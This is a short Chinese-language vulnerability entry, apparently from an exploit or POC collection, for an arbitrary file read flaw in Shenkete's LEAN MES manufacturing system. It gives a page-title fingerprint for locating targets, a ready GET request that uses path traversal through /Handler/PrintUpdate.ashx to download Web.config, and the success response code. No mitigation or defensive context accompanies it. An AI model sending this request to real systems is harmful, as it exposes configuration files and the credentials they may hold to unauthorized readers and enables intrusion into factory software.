# 深科特LEANMESPrintUpdate.aspx存在任意文件读取漏洞

深科特 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`GET /Handler/PrintUpdate.ashx?action=DownLoadFile&file=..%2F..%2FWeb.config HTTP/1.1`
- **响应特征**：200